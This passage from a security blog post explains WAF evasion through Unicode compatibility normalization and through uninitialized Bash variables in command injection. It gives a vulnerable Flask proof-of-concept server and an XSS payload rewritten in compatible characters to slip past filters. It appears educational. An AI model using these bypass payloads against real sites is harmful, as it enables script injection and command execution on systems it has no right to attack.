<em><a href=http://www.unicode.org/reports/tr15/print-images/UAX15-NormFig6.jpg>http://www.unicode.org/reports/tr15/print-images/UAX15-NormFig6.jpg</a></em></p><p>Unicode Compatibility is a concept that describes the decomposition of visually distinct characters into the same basic abstract character. It is a form of <a href=https://en.wikipedia.org/wiki/Unicode_equivalence>unicode equivalence</a>.</p><p>For instance, the characters<code>／</code>(U+FF0F) and <code>/</code> (U+002F) are different, but in some contexts they will have the same meaning as each other. The shared meaning allows for the characters are compatible with each other, meaning that they can both be translated to the standard forward-slash character<code>/</code>(U+002F) despite starting out as different characters. Digging deeper, whether <code>／</code>(U+FF0F) and <code>/</code> (U+002F) will end up as the same forward-slash character depends on the way that they are normalized, or translated, by the web server.</p><p>Characters are typically normalized through one of the four standard Unicode normalization algorithms:</p><ul><li><strong>NFC:</strong> Normalization Form Canonical Composition</li><li><strong>NFD:</strong> Normalization Form Canonical Decomposition</li><li><strong>NFKC:</strong> Normalization Form Compatibility Composition</li><li><strong>NFKD:</strong> Normalization Form Compatibility Decomposition</li></ul><p>NFKC and NFKD in particular will decompose the characters by compatibility, which is unlike NFC and NFD (more details <a href=https://www.unicode.org/reports/tr15/>here</a>). The implication is that on web servers where the user input is first sanitized, then normalized with either NFKC or NFKD, the unexpected, compatible characters can bypass the WAF and execute as their canonical equivalents on the backend. This is a result of the WAF not expecting unicode-compatible characters. <a href=https://jlajara.gitlab.io/Bypass_WAF_Unicode>Jorge Lahara</a> demonstrates this in the PoC webserver below.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>from flask import Flask, abort, request  
</span></span><span style=display:flex><span>import unicodedata  
</span></span><span style=display:flex><span>from waf import waf  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>app = Flask(\_\_name\_\_)  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>@app.route(&#39;/&#39;)  
</span></span><span style=display:flex><span>def Welcome\_name():  
</span></span><span style=display:flex><span> name = request.args.get(&#39;name&#39;)  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span> if waf(name):  
</span></span><span style=display:flex><span> abort(403, description=&#34;XSS Detected&#34;)  
</span></span><span style=display:flex><span> else:  
</span></span><span style=display:flex><span> name = unicodedata.normalize(&#39;NFKD&#39;, name) #NFC, NFKC, NFD, and NFKD  
</span></span><span style=display:flex><span> return &#39;Test XSS: &#39; + name  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>if \_\_name\_\_ == &#39;\_\_main\_\_&#39;:  
</span></span><span style=display:flex><span> app.run(port=81)
</span></span></code></pre></div><p>Where the inial payload of <code>＜img src=p onerror='prompt(1)'></code> may have been detected by the firewall, the payload constructed with Unicode-compatible characters (<code>＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥</code>) would remain undetected.</p><p>Web servers that normalize input after it has been sanitized may be vulnerable to WAF bypass through Unicode compatibility. Compatible characters can be found <a href=https://www.compart.com/en/unicode>here</a>.</p><ol start=5><li>Uninitialized Variables</li></ol><hr><p>Another potential method is to use uninitialized variables in your request (e.g. <code>$u</code>) as demonstrated in this <a href=https://www.secjuice.com/web-application-firewall-waf-evasion/>article</a>. This is possible in command execution scenarios because Bash treats uninitialized variables as empty strings. When concatenating empty strings with a command payload, the result ends up being the command payload.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/0*Dn2ov32HcZKKSE-4.png alt>
<em><a href=https://www.secjuice.com/content/images/2018/08/image-3.png>https://www.secjuice.com/content/images/2018/08/image-3.png</a></em></p><p>When on a system that is vulnerable to command injection, inserting uninitialized variables in the payload can act as a form of obfuscation, bypassing the firewalls.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/0*0jvcJnOSNRnOcYZJ.png alt>
<em><a href=https://www.secjuice.com/content/images/2018/08/waf3_2.png>https://www.secjuice.com/content/images/2018/08/waf3_2.png</a></em></p><h1 id=more-reading>More Reading<a hidden class=anchor aria-hidden=true href=#more-reading>#</a></h1><ul><li><a href=https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/>https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/</a></li><li><a href=https://jlajara.gitlab.io/Bypass_WAF_Unicode>https://jlajara.gitlab.io/Bypass_WAF_Unicode</a></li><li><a href=https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/>https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/</a></li><li><a href=https://www.secjuice.com/web-application-firewall-waf-evasion/>https://www.sisainfosec.com/blogs/identifying-web-application-firewall-in-a-network/</a></li><li><a href=https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_WAF_Profiling_and_Evasion.pdf>https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_WAF_Profiling_and_Evasion.pdf</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://ally-petitt.com/en/tags/waf/>WAF</a></li><li><a href=https://ally-petitt.com/en/tags/defense-evasion/>Defense Evasion</a></li></ul><nav class=paginav><a class=prev href=https://ally-petitt.com/en/posts/2023-07-13_reverse-engineering---analyzing-headers-23dc84075cd/><span class=title>« Prev</span><br><span>Reverse Engineering — Analyzing Headers</span>
</a><a class=next href=https://ally-petitt.com/en/posts/2023-05-13_5-ways-i-found-your-deleted-files-492407dbd467/><span class=title>Next »</span><br><span>5 Ways I Found Your Deleted Files</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share 5 Ways I Bypassed Your Web Application Firewall (WAF) on x" href="https://x.com/intent/tweet/?text=5%20Ways%20I%20Bypassed%20Your%20Web%20Application%20Firewall%c2%a0%28WAF%29&amp;url=https%3a%2f%2fally-petitt.com%2fen%2fposts%2f2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2%2f&amp;hashtags=WAF%2cDefenseEvasion"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share 5 Ways I Bypassed Your Web Application Firewall (WAF) on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fally-petitt.com%2fen%2fposts%2f2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2%2f&amp;title=5%20Ways%20I%20Bypassed%20Your%20Web%20Application%20Firewall%c2%a0%28WAF%29&amp;summary=5%20Ways%20I%20Bypassed%20Your%20Web%20Application%20Firewall%c2%a0%28WAF%29&amp;source=https%3a%2f%2fally-petitt.com%2fen%2fposts%2f2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share 5 Ways I Bypassed Your Web Application Firewall (WAF) on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fally-petitt.com%2fen%2fposts%2f2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2%2f&title=5%20Ways%20I%20Bypassed%20Your%20Web%20Application%20Firewall%c2%a0%28WAF%29"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share 5 Ways I Bypassed Your Web Application Firewall (WAF) on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fally-petitt.com%2fen%2fposts%2f2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share 5 Ways I Bypassed Your Web Application Firewall (WAF) on whatsapp" href="https://api.whatsapp.com/send?text=5%20Ways%20I%20Bypassed%20Your%20Web%20Application%20Firewall%c2%a0%28WAF%29%20-%20https%3a%2f%2fally-petitt.com%2fen%2fposts%2f2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share 5 Ways I Bypassed Your Web Application Firewall (WAF) on telegram" href="https://telegram.me/share/url?text=5%20Ways%20I%20Bypassed%20Your%20Web%20Application%20Firewall%c2%a0%28WAF%29&amp;url=https%3a%2f%2fally-petitt.com%2fen%2fposts%2f2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share 5 Ways I Bypassed Your Web Application Firewall (WAF) on ycombinator" href="https://news.ycombinator.com/submitlink?t=5%20Ways%20I%20Bypassed%20Your%20Web%20Application%20Firewall%c2%a0%28WAF%29&u=https%3a%2f%2fally-petitt.com%2fen%2fposts%2f2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://ally-petitt.com/en/>Ally Petitt</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>